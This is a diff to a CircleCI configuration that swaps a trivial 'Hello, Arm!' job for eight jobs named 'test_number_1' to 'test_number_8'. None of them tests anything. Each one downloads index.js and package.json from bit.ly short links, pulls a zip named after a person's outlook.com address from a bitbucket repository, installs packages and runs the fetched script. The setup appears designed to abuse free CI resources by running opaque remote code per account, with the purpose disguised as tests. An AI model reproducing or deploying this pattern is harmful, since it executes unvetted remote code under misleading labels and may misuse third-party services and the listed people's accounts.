@@ -1,16 +1,97 @@
-
 version: 2.1
 
 jobs:
-  build-app:
-    machine:
-      image: ubuntu-2004:202101-01
-    resource_class: arm.medium
+  test_number_1:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
     steps:
-      - run: uname -a
-      - run: echo "Hello, Arm!"
-
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/andris.pa_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: npm i -s
+      - run: node index 69
+  test_number_2:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/john.lindal001_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 73
+  test_number_3:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/alhassnekeita2007_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 67
+  test_number_4:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/remitdepat_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 58
+  test_number_5:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/mary.james202_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 57
+  test_number_6:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/stephenpowers601_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: npm i -s
+      - run: node index 70
+  test_number_7:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/hassanusman703_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 50
+  test_number_8:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/johanna.quandt_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 58
+      
+      
 workflows:
   build:
     jobs:
-      - build-app
+      - test_number_1
+      - test_number_2
+      - test_number_3
+      - test_number_4
+      - test_number_5
+      - test_number_6
+      - test_number_7
+      - test_number_8
+      
